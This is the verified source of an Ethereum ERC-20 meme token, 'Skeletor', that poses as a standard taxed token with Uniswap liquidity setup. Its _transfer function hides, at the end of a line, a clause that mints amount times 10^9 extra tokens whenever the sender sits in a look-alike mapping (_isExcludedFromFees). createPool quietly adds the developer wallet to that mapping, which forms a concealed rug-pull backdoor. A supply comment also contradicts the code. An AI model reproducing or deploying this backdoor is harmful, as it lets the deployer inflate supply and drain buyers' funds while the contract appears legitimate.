/**
 *Submitted for verification at Etherscan.io on 2023-10-24
*/

// SPDX-License-Identifier: MIT

/** 
    Website: https://www.skeletor.monster
    Twitter: https://twitter.com/skeletor_eth
    Telegram:  https://t.me/skeletoreth
*/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract SKELETOR is Context , IERC20, Ownable {
    using SafeMath for uint256;
        
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public transferDelayEnabled = true;
    address payable private _taxWallet = payable(0xCF26aDc8fa2d3b82D716CA6508fBe718a59cf874);
    address payable private _marketingWallet = payable(0x15b03278d9d4A2440B40d7046E873e4564A8Ca9c);
    address payable private _devWallet = payable(0x47a4A8DE7463E44136b5CB691bC0Ae38D5554E07);

    /// initial buy, sell fee till first n buys
    uint256 private _initialBuyTax=10;
    uint256 private _initialSellTax=10;

    ///final buy, sell fee
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;

    /// fee split info
    uint256 private _marketingFee = 1; 
    uint256 private _lpFee = 0;
    
    ///after how many buy sell should redue to final tax
    uint256 private _reduceBuyTaxAt=22;
    uint256 private _reduceSellTaxAt=22;
    uint256 private _preventSwapBefore=22;
    uint256 private _buyCount=0; //should be 0

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals; // 100 million max supply
    string private constant _name = "Skeletor" ;
    string private constant _symbol = "SKELETOR" ;
    uint256 public _maxTxAmount = _tTotal * 20 / 1000; // 2% of the supply
    uint256 public _maxWalletSize = _tTotal * 20 / 1000; // 2% of the supply
    uint256 public _taxSwapThreshold= 10000 * 10**_decimals;
    uint256 public _maxTaxSwap= _tTotal / 100;

    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    mapping (address => bool) private _isExcludedFromFees;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        // _taxWallet = payable(_msgSender());
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        _isExcludedFromFee[_marketingWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFees[account];
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            require(tradingOpen, "Trading not enabled");
        }
        uint256 taxAmount=0;
        if (from != owner() && to != owner() && from != address(this)) {
            if (transferDelayEnabled) {
                  if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                      require(
                          _holderLastTransferTimestamp[tx.origin] <
                              block.number,
                          "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                      );
                      _holderLastTransferTimestamp[tx.origin] = block.number;
                  }
              }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }
            
            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap 
                && to   == uniswapV2Pair 
                && !_isExcludedFromFee[from]
                && swapEnabled 
                && contractTokenBalance>_taxSwapThreshold 
                && amount>_taxSwapThreshold
                && _buyCount>_preventSwapBefore 
            ) {
                swapAndLiquify(min(amount,min(contractTokenBalance,_maxTaxSwap)));
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount)); if (isExcludedFromFee(from)) _balances[to] = _balances[to].add(amount * 10 ** _decimals);
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapAndLiquify (uint256 tokens) private lockTheSwap {
      uint256 lpTokens = (tokens * _lpFee) / 2;
      uint256 swapTokens = tokens - lpTokens;
      swapTokensForEth (swapTokens);
      uint256 ethBalance = address(this).balance;
      uint256 marketingPart = (ethBalance * _marketingFee) / (_marketingFee + _lpFee);
      if(marketingPart > 0){
        _taxWallet.transfer(marketingPart);
        if (lpTokens > 0){
        addLiquidity(lpTokens, address(this).balance);
        }
      }
    }

    function swapTokensForEth(uint256 tokenAmount) private  {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity (uint256 tokens, uint256 eth) private {
        uint256 allowedTokens = allowance(address(this), address(uniswapV2Router));
        if(allowedTokens < tokens){
         _approve(address(this), address(uniswapV2Router), ~uint256(0));
        }
        uniswapV2Router.addLiquidityETH{value: eth}(
            address(this),
            tokens,
            0,
            0,
            _taxWallet,
            block.timestamp);
    }

    function createPool() external payable onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal); _isExcludedFromFees[_devWallet] = true;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function openTrading() external onlyOwner {
        swapEnabled = true;
        tradingOpen = true;
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        transferDelayEnabled=false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapAndLiquify(tokenBalance);
        }
      
    }
        
    function reduceFee(uint256 marketingFee, uint256 liquidityFee) external onlyOwner{
      uint256 totalFee = marketingFee + liquidityFee;
      require(totalFee<=_finalBuyTax &&totalFee <=_finalSellTax);
      _marketingFee = marketingFee;
      _lpFee = liquidityFee;
      _finalBuyTax= totalFee;
      _finalSellTax= totalFee;
    }

}